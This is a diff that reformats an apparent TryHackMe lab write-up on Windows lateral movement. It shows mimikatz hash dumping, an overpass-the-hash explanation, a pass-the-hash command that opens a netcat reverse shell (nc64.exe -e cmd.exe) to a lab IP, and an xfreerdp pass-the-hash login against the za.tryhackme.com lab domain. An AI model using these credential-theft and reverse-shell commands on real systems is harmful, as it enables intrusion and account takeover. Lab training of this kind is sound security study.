@@ -609,7 +609,7 @@ mimikatz # token::elevate
 mimikatz # lsadump::sam   
 RID  : 000001f4 (500)
 User : Administrator
-  Hash NTLM: 145e02c50333951f71d13c245d352b50
+Hash NTLM: 145e02c50333951f71d13c245d352b50
 
 ```
 LSASS memory dump
@@ -813,9 +813,10 @@ Cached Tickets: (1)
 ```
 
 ### Overpass‑the‑Hash / Pass‑the‑Key (OPtH / PtK)
+
 Concept:  
-Kerberos authentication uses encryption keys derived from passwords (DES, RC4, AES128, AES256).
-If you have one of these keys, you can request a TGT without knowing the password.
+- Kerberos authentication uses encryption keys derived from passwords (DES, RC4, AES128, AES256).
+- If you have one of these keys, you can request a TGT without knowing the password.
 
 Commands to extract keys:
 ```
@@ -933,7 +934,7 @@ User : Administrator
   Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7                               
 ...                                               
 ```
-#Administrator in this case
+#### Administrator in this case
 The Administrator NTLM hash is unique per machine, even inside a domain.
 That’s exactly why the Administrator hash you dumped on THMJMP2 will NOT work on THMIIS or any other host.
 
@@ -966,7 +967,8 @@ SID               : S-1-5-21-3330634377-1326264276-632209373-4607
 ```
 Then use to connect
 ```
-mimikatz #          mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:5
+mimikatz #
+mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:5
 33f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74
 .7 5555"                                                                    
 user    : t1_toby.beck                                                      
@@ -999,7 +1001,6 @@ Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>whoami
-whoami
 za\t2_felicia.dean
 
 # this is normal but can access files from toby.beck
@@ -1017,7 +1018,7 @@ THM{NO_PASSWORD_NEEDED}
 ```
 xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
 ```
-#Did not seem to work, asks for accepting something like
+#### Did not seem to work, asks for accepting something like
 ```
 xfreerdp /v:THMJMP2.za.tryhackme.com /u:ZA\Administrator /pth:0b2571be7e75e3dbd169ca5352a2dad7
 ```
